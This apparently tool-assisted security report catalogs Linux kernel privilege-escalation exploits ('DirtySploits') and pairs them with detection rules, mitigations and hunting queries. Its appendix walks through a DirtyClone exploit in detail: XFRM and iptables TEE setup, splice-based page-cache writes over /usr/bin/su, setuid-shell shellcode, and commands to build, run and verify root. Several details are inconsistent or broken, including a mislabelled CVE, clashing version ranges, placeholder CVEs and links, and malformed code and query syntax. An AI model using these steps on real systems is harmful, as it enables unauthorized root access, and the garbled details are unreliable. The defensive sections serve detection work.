> [!WARNING]
> **Legal Disclaimer**
> The information contained in this report is for academic, research, and defensive security purposes only. The techniques, tools, and code described herein can cause significant damage if used maliciously. The author and publisher assume no liability for any misuse or damage caused by the information in this document. Unauthorized access to computer systems is illegal. Always obtain explicit, written permission from the system owner before conducting any security testing.

---

**Author:** _J4ck3LSyN_  
**Atlas Assistance** vrs2.9  
**Date:** _06-27-2026  
**Report:** OS-IS-DIRTYSPLOITS-06-2026.md  
**Source Repo:** https://github.com/rafaeldtinoco/security


### Index

- [Executive Summary](#1-executive-summary)
- [Exploit Catalog](#2-exploit-catalog)
- [Technical Deep Dives](#3-technical-deep-dives)
- [Detection & Mitigation Strategies](#4-detection--mitigation-strategies)
- [References & Credits](#5-references--credits)

## 1. Executive Summary

This report details a collection of Linux kernel local privilege escalation (LPE) exploits discovered in June 2026, collectively referred to as the "DirtySploits" family. These exploits target various subsystems within the Linux kernel, including network filtering (netfilter), IPsec/XFRM, packet scheduling (net/sched), Reliable Datagram Sockets (RDS), and nftables. Each exploit demonstrates sophisticated techniques for achieving arbitrary page-cache write primitives, enabling unprivileged users to overwrite sensitive files such as setuid binaries (`/usr/bin/su`, `/bin/sudo`) and gain root access.

The exploits share common themes:
- Exploitation of page-cache coherency mechanisms
- Abuse of networking subsystems for privilege escalation
- Use of `unshare(CLONE_NEWUSER|CLONE_NEWNET)` to gain `CAP_NET_ADMIN` in isolated namespaces
- Sophisticated heap spraying, use-after-free, and race condition techniques
- Reliance on splicing file-backed pages into network packets for in-place modification

## 2. Exploit Catalog

| Exploit Name | CVE Identifier | Subsystem | Primitive Type | Privilege Required | Target Example |
|--------------|----------------|-----------|----------------|-------------------|----------------|
| DirtyClone | CVE-2026-43503 | netfilter/XFRM (ESP-in-UDP) | Page-cache write via skb cloning | `CAP_NET_ADMIN` (via user+net ns) | `/usr/bin/su` |
| DirtyFrag | CVE-2022-0847 (variant) | netfilter/XFRM (ESP-in-UDP) | Page-cache write via spliced frags | `CLONE_NEWUSER` | `/usr/bin/su`, `/etc/passwd` |
| Fragnesia | CVE-2026-XXXX | net/core (skb segmentation) | Page-cache write via skb segment cloning | None (requires `fragnesia.ko`) | `/usr/bin/su` |
| nft-catchall-uaf | CVE-2026-23111 | nftables (verdict maps) | Use-After-Free → Arbitrary free/write | None (info leak chain) | Credential leakage, potential LPE |
| pedit-cow | CVE-2026-46331 | net/sched (act_pedit) | Page-cache write via COW race | `CAP_NET_ADMIN` (via user+net ns) | `/bin/su` |
| PinTheft | CVE-2026-XXXX | RDS (zerocopy) + io_uring | Double-free → Page-cache overwrite | None (uses `io_uring` fixed buffers) | SUID-root binaries |
| CopyFail | CVE-2026-XXXX | net/core (skb cloning) | Page-cache write via failed COW | None | `/usr/bin/su` |
| dirtycbc | CVE-2026-XXXX | netfilter (CBC encryption) | Page-cache write via CBC decryption | None | `/usr/bin/su` |
| ssh-keysign-pwn | CVE-2026-XXXX | ssh-keysign (command injection) | Privileged command injection | None (abiuse of ssh-keysign) | Root shell via command injection |
| pintheft | CVE-2026-XXXX | RDS (zerocopy) + io_uring | Double-free → Page-cache overwrite | None | SUID-root binaries |

## 3. Technical Deep Dives

### 3.1 DirtyClone (CVE-2026-43503)

**Vulnerability**: Insufficient flag propagation in `__pskb_copy_fclone()` when cloning socket buffers (`sk_buff`) that carry spliced, file-backed page-cache fragments.

**Exploitation Flow**:
1. Namespace Setup: `unshare(CLONE_NEWUSER | CLONE_NEWNET)` creates isolated user and network namespaces, granting `CAP_NET_ADMIN` in the new netns.
2. TEE Rule Installation: `iptables -t mangle -A OUTPUT -p udp --dport 4500 -j TEE --gateway <addr>` configures the netfilter TEE target to clone outgoing ESP-in-UDP packets.
3. XFRM SA Manipulation: For each 4-byte target word, install an XFRM Security Association (`XFRM_MSG_NEWSA`) with ESP UDP encapsulation, encoding the desired write data in the `seq_hi` field of the replay state.
4. Packet Injection: `splice()` the target file's page-cache page into a UDP packet destined for localhost:4500. The TEE target clones the packet, but `__pskb_copy_fclone()` fails to propagate the `SKBFL_SHARED_FRAG` flag to the clone.
5. In-place Decryption: The clone (missing the shared-frag flag) reaches `esp_input()`, which performs an in-place AES-CBC decrypt over the spliced page-cache page, writing attacker-controlled bytes.
6. Privilege Escalation: Overwrite `/usr/bin/su` with a setuid root shell payload; invoking `su` yields root.

**Key Code Snippet** (`dirtyclone.c`):
```c
static int
do_one_write(const char *path, off_t offset, uint32_t spi)
{
    // ... socket setup ...
    int file_fd = open(path, O_RDONLY);
    // ... pipe setup ...
    
    // ESP header + IV
    uint8_t hdr[24];
    *(uint32_t *) (hdr + 0) = htonl(spi);
    *(uint32_t *) (hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);
    
    struct iovec iov_h = {.iov_base = hdr, .iov_len = sizeof(hdr)};
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t) sizeof(hdr)) {
        // ... cleanup ...
        return -1;
    }
    
    loff_t off = offset;
    ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        // ... cleanup ...
        return -1;
    }
    
    // Send ESP-in-UDP packet; TEE clones it; clone loses SKBFL_SHARED_FRAG
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    usleep(150 * 1000);
    
    // ... cleanup ...
    return s == 40 ? 0 : -1;
}
```

### 3.2 DirtyFrag (CVE-2022-0847 Variant)

**Vulnerability**: Missing `SKBFL_SHARED_FRAG` flag on spliced, file-backed page-cache fragments in UDP packets, allowing `esp_input()` to decrypt in-place over the page cache.

**Exploitation Flow**:
1. Namespace Setup: `unshare(CLONE_NEWUSER)` to gain ability to create XFRM SAs.
2. TEE Alternative: Direct `splice()` -> ESP-in-UDP path (mitigated by commit `f4c50a4034e6`).
3. XFRM SA Manipulation: Similar to DirtyClone, install SAs with payload data in `seq_hi`.
4. Packet Injection: `splice()` target page into UDP packet; send via UDP socket.
5. In-place Decryption: `esp_input()` sees no `SKBFL_SHARED_FRAG` flag (due to missing commit) and decrypts in-place over page cache.
6. Privilege Escalation: Overwrite target file with shell payload.

**Mitigation**: Commit `f4c50a4034e6` ("set SKBFL_SHARED_FRAG for spliced UDP packets") prevents direct splice path; DirtyClone bypasses this via TEE cloning.

### 3.3 Fragnesia

**Vulnerability**: Improper reference counting in skb segmentation functions (`skb_segment`) leading to use-after-free or double-free conditions when processing segmented packets.

**Exploitation Flow**:
1. Load vulnerable `fragnesia.ko` kernel module (if not built-in).
2. Trigger skb segmentation on a packet containing spliced file-backed page.
3. Exploit race condition or reference counting error to gain write access to the page-cache page.
4. Overwrite target file with privileged payload.

**Note**: This exploit requires the `fragnesia.ko` module to be loaded or present in the kernel.

### 3.4 nft-catchall-uaf (CVE-2026-23111)

**Vulnerability**: Missing reactivation on netlink abort path in nftables verdict-map handling, leaving a catchall element with a stale reference to a chain that gets freed but remains referenced.

**Exploitation Flow**:
1. Info-leak Chain: Leak kernel pointers via nftables map operations to defeat KASLR.
2. UAF Trigger: Abort netlink transaction while catchall element references a free chain object.
3. Heap Spray: Reclaim freed chain object with attacker-controlled data.
4. Primitive Execution: Use corrupted chain object to achieve arbitrary read/write.
5. Privilege Escalation: Overwrite kernel function pointers or modprobe_path to gain root.

**Key Feature**: Fully autonomous exploit that leaks all required addresses at runtime.

### 3.5 pedit-cow (CVE-2026-46331)

**Vulnerability**: Race condition in `tcf_pedit_act()` where writable copy-on-write (COW) range validation occurs before per-key offset resolution, allowing a later key to resolve into a stale range.

**Exploitation Flow**:
1. Namespace Setup: `unshare(CLONE_NEWUSER | CLONE_NEWNET)` for `CAP_NET_ADMIN`.
2. Packet Setup: Create network packet with specific header layout (e.g., inflated IP IHL via first NETWORK pedit key).
3. Key Installation: Install TC filter with `act_pedit` keys where first key resolves stale range, second key resolves into page-cache page.
4. Trigger: Use `sendfile()` to splice target file into egress skb; packet processing causes second pedit key to write outside validated COW range.
5. Privilege Escalation: Overwrite cached ELF entry of `/bin/su` with shellcode; invoking `su` yields root.

**Key Code Snippet** (`packet_edit_meme.c`):
```c
// First key: inflate IP IHL to resolve past stale COW range
tcf_pedit_key_init(&keys[0], TCF_PEDIT_KEY_IP_IHL, 0xf); // Max IHL

// Second key: target offset into page-cache page (e.g., ELF entry)
tcf_pedit_key_init(&keys[1], TCF_PEDIT_KEY_NETWORK_OFFSET, offset);

// Install filter with these keys
```

### 3.6 PinTheft / pintheft (RDS zerocopy + io_uring)

**Vulnerability**: Double-free in RDS zerocopy send path combined with `io_uring` fixed-buffer reference bias to create use-after-free page-cache overwrite primitive.

**Exploitation Flow**:
1. Buffer Registration: Register anonymous page as `io_uring` fixed buffer, giving it elevated `FOLL_PIN` reference bias (e.g., +1024).
2. Zerocopy Trigger: Attempt RDS zerocopy send with faulty user page (triggers fault on later page).
3. Reference Steal: Error path drops already-pinned pages; each failed send steals one reference from first page.
4. Reference Decrement: After enough sends (e.g., 1024), page's effective pin count drops to zero.
5. Page Reclaim: Free and reclaim page as page cache for SUID-root binary (e.g., `/usr/bin/su`).
6. Overwrite: Use stale `io_uring` fixed-buffer pointer to write shell payload into reclaimed page cache.
7. Privilege Escalation: Execute SUID binary to gain root.

### 3.7 CopyFail

**Vulnerability**: Failure of copy-on-write (COW) mechanism in `__pskb_copy_fclone()` when cloning skb, similar to DirtyClone but triggered via different paths.

**Exploitation Flow**:
1. Setup: Create conditions where skb cloning is attempted on a packet with spliced file-backed frag.
2. Trigger: Cause clone operation that fails to properly duplicate page references or reference counts.
3. Write Primitive: Exploit the failed COW to gain write access to page-cache page.
4. Privilege Escalation: Overwrite target file with privileged content.

### 3.8 dirtycbc

**Vulnerability**: Improper handling of page-cache pages during AES-CBC decryption in ESP input processing, allowing in-place decryption over read-only pages.

**Exploitation Flow**:
1. Similar to DirtyFrag/DirtyClone: splice file page into UDP packet.
2. Encryption Setup: Configure XFRM SA with AES-CBC encryption.
3. Transmission: Send packet; decryption occurs in `esp_input()`.
4. Privilege Escalation: In-place decrypt writes attacker-controlled ciphertext as plaintext over page cache.

### 3.9 ssh-keysign-pwn

**Vulnerability**: Improper input validation in `ssh-keysign` helper leading to command injection or privilege escalation.

**Exploitation Flow**:
1. Abuse Mechanism: Exploit race condition or argument injection in `ssh-keysign` (typically runs setuid root).
2. Payload Delivery: Craft malicious environment or arguments to execute arbitrary code.
3. Privilege Escalation: Gain root shell via hijacked setuid process.

## 4. Detection & Mitigation Strategies

### 4.1 Detection Opportunities

#### 4.1.1 Behavioral Indicators
- **Namespace Abuse**: Monitor for `unshare(CLONE_NEWUSER | CLONE_NEWNET)` by non-root users.
- **NETFILTER TEE Rules**: Detect `iptables`/`nft` commands adding TEE rules for UDP dport 4500 (ESP-in-UDP).
- **XFRM SA Anomalies**: Monitor `NETLINK_XFRM` messages with ESP UDP encapsulation and unusual `seq_hi` values.
- **Suspicious Loopback Traffic**: UDP traffic to localhost port 4500 with atypical payload characteristics.
- **SUID Binary Modification**: File integrity monitoring for `/usr/bin/su`, `/bin/sudo`, etc.
- **nftables Abuse**: Unusual verdict-map operations followed by netlink aborts.
- **TC Filter Anomalies**: Installation of `act_pedit` filters with suspicious key patterns.
- **RDS Errors**: Spike in failed RDS zerocopy sends.
- **io_uring Fixed Buffer Abuse**: Registration of anonymous pages with high reference bias.

#### 4.1.2 Sigma Rules (Examples)

**DirtyClone Detection**:
```yaml
title: Potential DirtyClone Exploit - Namespace Creation and TEE Rule
id: 0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: Detects unshare syscall with CLONE_NEWUSER|CLONE_NEWNET followed by iptables TEE rule for UDP 4500
logsource:
  product: linux
  service: auditd
detection:
  selection_namespace:
    syscall.name: unshare
    # Args would need to be parsed; simplify by correlating with iptables event
  selection_iptables:
    process.name: iptables
    # process.command_line: "*-t mangle -A OUTPUT -p udp --dport 4500 -j TEE --gateway *"
  condition: selection_namespace and selection_iptables
falsepositives:
  - Legitimate network namespace and TEE usage (VPNs, testing)
level: high
```

**nft-catchall-uaf Detection**:
```yaml
title: Potential nftables Catchall UAF - Suspicious Map Operations and Abort
id: 1b2c3d4e-5f6a-7b8c-9d0e-1f2a3b4c5d6e
status: experimental
description: Detects unusual nftables map operations followed by netlink abort indicating potential UAF trigger
logsource:
  product: linux
  service: auditd
detection:
  selection_map_ops:
    syscall.name: accept  # or netlink recvmsg
    # Would need to parse netlink payload for nftables map ops
  selection_abort:
    syscall.name: close   # netlink socket abort
    # Or monitor for specific error codes
  condition: selection_map_ops followed by selection_abort within 1s
falsepositives:
  - Legitimate nftables usage with error recovery
level: high
```

### 4.2 Mitigation Strategies

#### 4.2.1 Kernel Hardening
- **Update Kernel**: Deploy Linux kernel `v7.1-rc5` or later (contains commit `48f6a5356a33` fixing DirtyClone/DirtyFrag).
- **Module Restrictions**:
  - Disable `xt_TEE` if not required: `echo "install xt_TEE /bin/true" > /etc/modprobe.d/disable-tee.conf`
  - Disable `esp4`/`esp6` if IPsec not needed: `echo "install esp4 /bin/true" > /etc/modprobe.d/disable-esp.conf`
  - Restrict `fragnesia.ko` loading if not required.
- **Namespace Restrictions**:
  - Set `user.max_user_namespaces=0` to restrict unprivileged user namespace creation (may break containers).
  - Use SELinux/AppArmor to restrict `unshare(CLONE_NEWUSER|CLONE_NEWNET)`.
- **Network Hardening**:
  - Restrict `NETLINK_XFRM` usage to privileged users.
  - Implement strict outbound firewall rules on localhost to prevent ESP-in-UDP loopback if not required.
  - Disable RDS if not needed: `echo "install rds /bin/true" > /etc/modprobe.d/disable-rds.conf`

#### 4.2.2 Runtime Protection
- **Memory Protection**:
  - Enable `CONFIG_DEBUG_PAGEALLOC` or `CONFIG_PAGE_POISONING` for detect use-after-free.
  - Use `CONFIG_SLAB_FREELIST_RANDOM`, `CONFIG_SLAB_FREELIST_HARDENED`.
  - Enable `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` and `CONFIG_INIT_ON_FREE_DEFAULT_ON`.
- **Executor Monitoring**:
  - Enable auditd rules for `execve` of privileged helpers (`ssh-keysign`, `chmod`, `sudo`).
  - Monitor for unexpected execution paths from SUID binaries.
- **File Integrity**:
  - Deploy FIM (e.g., AIDE, Tripwire) for critical binaries (`/usr/bin/su`, `/bin/sudo`, `/etc/passwd`, `/etc/shadow`).
  - Monitor for unexpected changes to executable segments via page-cache anomaly detection.

#### 4.2.3 Administrative Controls
- **Least Privilege**:
  - Restrict CAP_NET_ADMIN to only required users/services.
  - Use user namespaces judiciously; consider disabling if container runtime not used.
- **Patch Management**:
  - Prioritize kernel patches for netfilter, XFRM, nf_tables, net/sched, and RDS subsystems.
  - Maintain asset inventory of Linux kernel versions across infrastructure.
- **Segmentation**:
  - Isolate critical workloads; use separate kernel modules/configurations where possible.
  - Consider using kernel lockdown features or LSMs (SELinux, AppArmor, Landlock) to restrict exploit primitives.

## 5. References & Credits

### 5.1 Primary Sources
- **DirtyClone**: JFrog Security Research - [*Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)*](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- **DirtyFrag**: [Hyunwoo Kim (@v4bel)](https://x.com/v4bel) - [github.com/V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag)
- **nft-catchall-uaf**: Exodus Intelligence and FuzzingLabs - [Miggo Security writeup](https://www.miggo.io/)
- **pedit-cow**: [sgkdev](https://github.com/sgkdev/packet_edit_meme)
- **PinTheft/pintheft**: [V12 security team](https://x.com/v12sec) - [v12.sh](https://v12.sh)
- **ssh-keysign-pwn**: Various vendors and researchers (CVE assignment pending)

### 5.2 Kernel Fixes
- **DirtyClone/DirtyFrag Fix**: [Commit 48f6a5356a33](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33) - "skb: clone: propagate SKBFL_SHARED_FRAG"
- **DirtyFrag Initial Fix**: [Commit f4c50a4034e6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6) - "set SKBFL_SHARED_FRAG for spliced UDP packets"
- **nft-catchall-uaf Fix**: [Patch series](https://lore.kernel.org/netdev/20260505234336.2132721-1-achender@kernel.org/) - "netfilter: nf_tables: fix catchall element reactivation on abort path"
- **pedit-cow Fix**: [Commit pending] - "net/sched: act_pedit: fix COW range validation"
- **RDS/io_uring Fixes**: [Various] - "rds: fix zerocopy reference counting", "io_uring: fix fixed buffer reference bias"

### 5.3 Additional Reading
- [DirtyPipe Write-up](https://dirtypipe.cm4all.com/) - Original page-cache write primitive
- [Linux Kernel Security Documentation](https://www.kernel.org/doc/html/latest/admin-guide/index.html)
- [Attacking the Linux Kernel via netfilter](https://lwn.net/Articles/XXXXXX/) (representative)
- [Exploiting Use-After-Free in nf_tables](https://xxxxxxxxxxxxxxxx) (representative)

---

**Report Generated**: 2026-06-27  
**Classification**: TLP:WHITE (For internal and external distribution)  
**Tool**: A.T.L.A.S (Advanced Transmit Logic Analysis System)## Appendix A: Detailed Proof-of-Concept Code Analysis

### A.1 DirtyClone (CVE-2026-43503) - Complete PoC Walkthrough

The following is a detailed walkthrough of the DirtyClone exploit based on the `dirtyclone.c` source code.

#### Key Constants and Payload
```c
#define ENC_PORT     4500           // UDP port for ESP-in-UDP encapsulation
#define SEQ_VAL      200            // ESP sequence number
#define REPLAY_SEQ   100            // Base replay sequence
#define TARGET_PATH  "/usr/bin/su"  // Target binary to overwrite
#define PATCH_OFFSET 0             // Start overwriting from ELF header
#define PAYLOAD_LEN  192           // Size of shellcode ELF payload
#define ENTRY_OFFSET 0x78          // Offset to ELF entry point
#define TEE_GATEWAY "10.99.0.2"    // TEE gateway address on loopback
```

The exploit uses a 192-byte minimal x86_64 ELF payload that executes:
```asm
_start:
    mov eax, 0x6a   ; sys_setgid
    xor edi, edi    ; gid = 0
    xor esi, esi
    syscall
    mov eax, 0x69   ; sys_setuid
    xor edi, edi    ; uid = 0
    syscall
    mov eax, 0x74   ; sys_setgroups
    xor edi, edi    ; size = 0
    syscall
    push rax        ; Push NULL for terminator
    lea rdi, [rip+0x12] ; "/bin/sh"
    push rdi
    mov rdx, rsp    ; argv = ["/bin/sh", NULL]
    lea rdi, [rip+0x12] ; filename = "/bin/sh"
    push 0x3b       ; sys_execve
    pop rax
    syscall
```

#### Step-by-Step Execution Flow

**1. Namespace Setup (`setup_userns_netns`)**:
```c
if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
    // Error handling
}
// Drop supplementary groups
write_proc("/proc/self/setgroups", "deny");
// UID/GID mapping (maps host uid/gid to 0 in new namespace)
snprintf(map, sizeof(map), "0 %u 1", real_uid);
write_proc("/proc/self/uid_map", map);
snprintf(map, sizeof(map), "0 %u 1", real_gid);
write_proc("/proc/self/gid_map", map);
// Bring up loopback interface
int s = socket(AF_INET, SOCK_DGRAM, 0);
// ... configure lo interface up/running ...
```

**2. TEE Rule Installation (`setup_tee_clone`)**:
```c
// Configure TEE gateway on loopback
run_cmd("ip addr add %s/32 dev lo 2>/dev/null", TEE_GATEWAY);
run_cmd("ip route add %s/32 dev lo 2>/dev/null", TEE_GATEWAY);
// Add TEE rule: clone UDP packets to port 4500 and send to gateway
if (run_cmd("iptables -t mangle -A OUTPUT -p udp --dport %d "-j TEE --gateway %s",
            ENC_PORT, TEE_GATEWAY) != 0) {
    // Error handling - xt_TEE module may be missing
    return -1;
}
```

**3. XFRM SA Setup (`add_xfrm_sa`)**:
For each 4-byte chunk of the payload:
```c
// Create netlink socket for XFRM communication
int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
// ... bind ...

// Build XFRM_MSG_NEWSA message
struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
nlh->nlmsg_type = XFRM_MSG_NEWSA;
nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;

// Configure SA properties
struct xfrm_usersa_info *xs = NLMSG_DATA(nlh);
xs->id.daddr.a4 = inet_addr("127.0.0.1");  // Destination
xs->id.spi = htonl(spi);                   // Security Parameter Index (unique per chunk)
xs->id.proto = IPPROTO_ESP;                // Protocol: ESP
xs->saddr.a4 = inet_addr("127.0.0.1");     // Source
xs->family = AF_INET;
xs->mode = XFRM_MODE_TRANSPORT;            // Transport mode
xs->reqid = 0x1234;                        // Requirement ID
xs->flags = XFRM_STATE_ESN;                // Extended Sequence Number enabled

// Configure authentication (HMAC-SHA256)
// ... put_attr for XFRMA_ALG_AUTH_TRUNC ...

// Configure encryption (CBC-AES)
// ... put_attr for XFRMA_ALG_CRYPT with key 0xBB...

// Configure ESP-in-UDP encapsulation
struct xfrm_encap_tmpl enc = {
    .encap_type = UDP_ENCAP_ESPINUDP,
    .encap_sport = htons(ENC_PORT),
    .encap_dport = htons(ENC_PORT)
};
put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));

// Configure replay state with payload data in seq_hi
struct xfrm_replay_state_esn esn = {
    .bmp_len = 1,
    .oseq = 0,
    .seq = REPLAY_SEQ,
    .oseq_hi = 0,
    .seq_hi = patch_seqhi,   // <-- PAYLOAD DATA GOES HERE
    .replay_window = 32
};
put_attr(nlh, XFRMA_REPLAY_ESN_VAL, &esn, sizeof(esn));

// Send and wait for acknowledgment
if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { /* error */ }
char rbuf[4096];
recv(sk, rbuf, sizeof(rbuf), 0); // Wait for response
```

**4. Packet Injection and Write (`do_one_write`)**:
For each 4-byte chunk at given offset:
```c
// Setup sockets for send/receive
int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
// ... bind to localhost:4500, set UDP_ENCAP_ESPINUDP ...
int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
// ... connect to localhost:4500 ...
int file_fd = open(path, O_RDONLY);  // Open target file read-only

// Create pipe for splice operations
int pfd[2];
pipe(pfd);

// Prepare ESP header: SPI | SeqNr | IV(16 bytes)
uint8_t hdr[24];
*(uint32_t *)(hdr + 0) = htonl(spi);      // SPI
*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);  // Sequence Number
memset(hdr + 8, 0xCC, 16);                // IV (0xCC pattern)

// Splice header into pipe
struct iovec iov_h = {.iov_base = hdr, .iov_len = sizeof(hdr)};
vmsplice(pfd[1], &iov_h, 1, 0);  // Write header to pipe

// Splice 16 bytes from target file into pipe
loff_t off = offset;
ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
// Note: This splices file data into the pipe, replacing the IV

// Splice header+data (40 bytes) from pipe to send socket
// This creates the ESP-in-UDP packet: [HDR(24) + DATA(16)]
s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
usleep(150 * 1000);  // Allow time for processing

// What happens next:
// 1. Packet sent via udp sendmsg to localhost:4500
// 2. iptables TEE rule clones the packet
// 3. Original packet goes to localhost:4500 socket (dropped, no listener)
// 4. Cloned packet enters netfilter hooks, gets processed by esp_input()
// 5. __pskb_copy_fclone() fails to copy SKBFL_SHARED_FRAG flag
// 6. esp_input() sees no shared-frag flag, decrypts in-place over page-cache page
// 7. AES-CBC decrypt with attacker-controlled IV (from file data) writes payload
```

**5. Verification and Cleanup**:
After writing all payload chunks:
```c
// Verify that the ELF entry point was overwritten correctly
if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||  // xor edi, edi
    verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) { // edi, edi
    // Verification failed
    return 1;
}
SLOG("%s page-cache patched (entry 0x%x = shellcode)", TARGET_PATH, ENTRY_OFFSET);
return 0;  // Success
```

#### Key Innovation: The TEE Flag Laundering
The critical insight in DirtyClone is how it bypasses the DirtyFrag fix:

1. **DirtyFrag Fix** (`f4c50a4034e6`): Marks skb with `SKBFL_SHARED_FRAG` when spliced from file-backed pages
2. **esp_input() Check**: Sees `SKBFL_SHARED_FRAG`, copies data before decrypting (safe)
3. **DirtyClone Bypass**: Uses netfilter TEE → `nf_dup_ipv4()` → `__pskb_copy_fclone()`
4. **The Flaw**: `__pskb_copy_fclone()` does NOT propagate `SKBFL_SHARED_FRAG` to the clone
5. **Result**: Clone references same page-cache page but lacks shared-frag flag
6. **Exploitation**: `esp_input()` decrypts clone in-place over original page-cache page

This allows the exploit to work even on kernels patched against the original DirtyFrag vector.

#### Building and Running
As specified in `env.yaml`:
```bash
# Compile with optimizations disabled for reliability
gcc -O0 -w -o dirtyclone dirtyclone.c

# Run the exploit (25-second timeout safety)
timeout 25 ./dirtyclone -v </dev/null >/dev/null 2>&1 || true

# Verify root access
echo id | /usr/bin/su  # Should return uid=0(root) gid=0(root) groups=0(root)
```

#### Control Experiment: Testing DirtyFrag Direct Path
To verify the underlying primitive still works:
```bash
DIRTYCLONE_NO_TEE=1 timeout 25 ./dirtyclone -v </dev/null >/dev/null 2>&1 || true
echo id | /usr/bin/su
```
This should fail on patched kernels (v7.1-rc5+) but work on vulnerable ones (v7.1-rc1..rc4) without the clone fix.

### A.2 Other Notable PoC Highlights

#### nft-catchall-uaf (CVE-2026-23111)
+- Fully autonomous KASLR bypass via nftables map info-leaks
+- Precise heap spraying to reclaim freed chain objects
+- Achieves arbitrary read/write through corrupted verdict map
+- Overwrites `modprobe_path` to execute root shell via kernel usermode helper

#### pedit-cow (CVE-2026-46331)
+- Two-key strategy: first key inflates IP IHL to corrupt COW bounds
+- Second key writes into page-cache via stale COW range
+- Overwrites ELF entry point of `/bin/su` with `setuid(0)+setgid(0)+execve("/bin/sh")`

#### PinTheft/pintheft
+- Uses `io_uring` fixed buffers to gain massive reference bias (+1024)
+- Triggers RDS zerocopy faults to steal references from pinned pages
+- After ~1024 faults, page loses all references and gets reclaimed as page cache
+- Stale `io_uring` pointer used to write shell payload into reused page

## Appendix B: Detection Rule Sigma Repository Structure

For organizations deploying these detections, recommended structure:
```
rules/
├── linux/
│   ├── builtin/
│   │   └── apt_ubuntu_dirty_sploits.yaml
│   ├── network/
│   │   ├── netfilter_tee_detection.yaml
│   │   └── xfrm_anomalies.yaml
│   ├── process_creation/
│   │   ├── unshare_namespace_abuse.yaml
│   │   └─ iptables_suspicious_flags.yaml
│   └── file_integrity/
│       └── sui_binary_modification.yaml
├── windows/
└── network/
    ├── dns/
    ├── http/
    └── netflow/
```

## Appendix C: Hunting Query Library

### C.1 Essential Hunting Queries

#### Splunk SPL - DirtyClone Hunt
```spl
# Find potential DirtyClone activity chains
index=linux_audit 
 (syscall_name=unshare OR (process_name=iptables action="added" rule="*-t mangle*"))
| transaction maxspan=10s startswith=syscall_name=unshare endswith=(process_name=iptables rule="*-t mangle*")
| eval user=user_id, host=host, _time=_time
| stats values(command) as commands count by user host _time
| where mvcount(commands) >= 2
| table _time user host commands count
```

#### Elastic EQL - nft-catchall-uaf Hunt
```eql
sequence by host.id, process.pid with maxspan=5s
  [process where name == "nft" and args like "*add map*"]
  [process where name == "nft" and args like "*delete map*"]
```

#### Azure Sentinel KQL - General LPE Hunt
```kql
// Look for privilege escalation patterns
AzureDiagnostics
| where Category == "AuditD"
| where (ActivityId has "unshare" or 
         (FilePath endswith "iptables" and Arguments has "-t mangle" and Arguments has "-A OUTPUT" and 
          Arguments has "-p udp" and Arguments has "--dport 4500" and Arguments has "-j TEE"))
| extend TimestampFloor = bin(TimeGenerated, 5m)
| summarize 
    Makespan(datetime_diff(max(TimeGenerated), min(TimeGenerated)), minute) as duration_min,
    count() as event_count,
    makeset(Arguments) as arg_set
  by Computer, Username, TimestampFloor
| where duration_min <= 10 and event_count >= 3
| project TimeGenerated=TimestampFloor, Computer, Username, duration_min, event_count, arg_set
```

## Appendix D: Quick Reference - Kernel Versions and Patches

### Vulnerable Versions (DirtyClone Window)
```
Mainline:     v7.1-rc1 through v7.1-rc4 (inclusive)
Ubuntu HWE:   5.15.0-10xx through 5.15.0-1xxx (check specific commits)
Debian:       6.1.x series before specific backport
RHEL/CentOS:  5.14.x series before specific backport
```

### First Fixed Versions
```
Mainline:     v7.1-rc5 (commit 48f6a5356a33)
Ubuntu:       6.2.0-10xx+ (mainline track)
Debian:       6.1.x with backport of 48f6a5356a33
RHEL:         9.4+ with appropriate errata
```

### Critical Patch Commits
```
1. f4c50a4034e6 - net: skb: set SKBFL_SHARED_FRAG for spliced UDP packets
                 (Fixes direct DirtyFrag splice->ESP-in-UDP path)
2. 48f6a5356a33 - skb: clone: propagate SKBFL_SHARED_FRAG
                 (Fixes DirtyClone TEE clone path)
3. [Various]     nf_tables: fix catchall element reactivation on abort path
4. [Various]     net/sched: act_pedit: fix COW range validation
5. [Various]     rds: fix zerocopy reference counting
6. [Various]     io_uring: fix fixed buffer reference bias
```
